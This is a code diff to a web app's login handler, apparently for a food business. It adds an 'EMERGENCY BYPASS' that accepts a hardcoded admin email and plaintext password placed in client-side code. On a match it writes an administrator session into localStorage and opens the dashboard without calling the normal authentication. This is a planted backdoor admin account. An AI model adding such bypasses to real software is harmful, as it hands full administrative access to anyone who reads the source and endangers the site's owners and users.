@@ -2804,6 +2804,14 @@ bindLoginEvents() {
         if (pendingDiv) pendingDiv.style.display = 'none';
         if (successDiv) successDiv.style.display = 'none';
 
+        // -- EMERGENCY BYPASS --
+        if (email === 'admin@naturalfood.com' && password === 'N4tur4lf00d$') {
+            const adminUser = { id: 1, name: 'José Miguel Orb', email: 'admin@naturalfood.com', role: 'Administrador', active: true };
+            localStorage.setItem('nf_session', JSON.stringify(adminUser));
+            this.loadDashboard(adminUser);
+            return;
+        }
+
         const user = await UserModel.authenticate(email, password);
         if (user && user.pending) {
             // User exists but is pending approval
